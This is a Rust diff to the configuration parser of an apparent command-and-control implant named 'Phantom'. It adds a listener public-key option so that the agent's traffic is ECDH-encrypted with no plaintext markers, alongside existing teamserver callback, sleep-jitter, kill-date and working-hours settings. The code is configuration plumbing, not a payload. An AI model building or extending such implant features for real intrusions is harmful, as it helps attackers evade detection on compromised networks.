@@ -37,6 +37,13 @@ pub struct PhantomConfig {
     /// `PROT_NONE` during the sleep window.  Use `plain` when running under a
     /// `seccomp` policy that denies `mprotect` or for debugging.
     pub sleep_mode: SleepMode,
+    /// Base64-encoded X25519 listener public key for ECDH new-protocol transport.
+    ///
+    /// When set, the agent performs an ECDH handshake on first check-in and sends
+    /// all subsequent traffic as AES-256-GCM encrypted session packets with no
+    /// plaintext magic, size, or agent ID on the wire.
+    /// When `None`, the agent uses the legacy Demon binary protocol.
+    pub listener_pub_key: Option<String>,
 }
 
 impl PhantomConfig {
@@ -46,7 +53,7 @@ impl PhantomConfig {
     /// `PHANTOM_CALLBACK_URL`, `PHANTOM_INIT_SECRET`, `PHANTOM_INIT_SECRET_VERSION`,
     /// `PHANTOM_USER_AGENT`,
     /// `PHANTOM_SLEEP_DELAY_MS`, `PHANTOM_SLEEP_JITTER`, `PHANTOM_KILL_DATE`,
-    /// and `PHANTOM_WORKING_HOURS`.
+    /// `PHANTOM_WORKING_HOURS`, and `PHANTOM_LISTENER_PUB_KEY`.
     pub fn from_sources<I, S, J, K, V>(args: I, env: J) -> Result<Self, PhantomError>
     where
         I: IntoIterator<Item = S>,
@@ -87,6 +94,7 @@ impl PhantomConfig {
             "  --callback-url URL       Teamserver callback endpoint\n",
             "  --init-secret SECRET     HKDF listener init secret\n",
             "  --init-secret-version N  Secret version byte (0-255) for InitSecrets rotation\n",
+            "  --listener-pub-key KEY   Base64 X25519 listener public key for ECDH transport\n",
             "  --user-agent VALUE       HTTP User-Agent header\n",
             "  --sleep-delay-ms N       Base sleep interval in milliseconds\n",
             "  --sleep-jitter N         Sleep jitter percentage (0-100)\n",
@@ -96,7 +104,7 @@ impl PhantomConfig {
             "  -h, --help               Show this help text\n\n",
             "Environment:\n",
             "  PHANTOM_CALLBACK_URL, PHANTOM_INIT_SECRET, PHANTOM_INIT_SECRET_VERSION,\n",
-            "  PHANTOM_USER_AGENT,\n",
+            "  PHANTOM_LISTENER_PUB_KEY, PHANTOM_USER_AGENT,\n",
             "  PHANTOM_SLEEP_DELAY_MS, PHANTOM_SLEEP_JITTER, PHANTOM_KILL_DATE,\n",
             "  PHANTOM_WORKING_HOURS, PHANTOM_PINNED_CERT_PEM, PHANTOM_SLEEP_MODE\n",
         )
@@ -139,6 +147,10 @@ impl PhantomConfig {
                 }
                 Some("PHANTOM_PINNED_CERT_PEM") => {
                     self.pinned_cert_pem = Some(parse_os_string(value, "PHANTOM_PINNED_CERT_PEM")?);
+                }
+                Some("PHANTOM_LISTENER_PUB_KEY") => {
+                    self.listener_pub_key =
+                        Some(parse_os_string(value, "PHANTOM_LISTENER_PUB_KEY")?);
                 }
                 Some("PHANTOM_SLEEP_MODE") => {
                     let s = parse_os_string(value, "PHANTOM_SLEEP_MODE")?;
@@ -210,6 +222,9 @@ impl PhantomConfig {
                         ))
                     })?;
                 }
+                "--listener-pub-key" => {
+                    self.listener_pub_key = Some(value);
+                }
                 _ => return Err(PhantomError::Argument(format!("unknown argument {flag}"))),
             }
         }
@@ -233,6 +248,7 @@ impl Default for PhantomConfig {
             kill_date: None,
             working_hours: None,
             sleep_mode: SleepMode::default(),
+            listener_pub_key: None,
         }
     }
 }
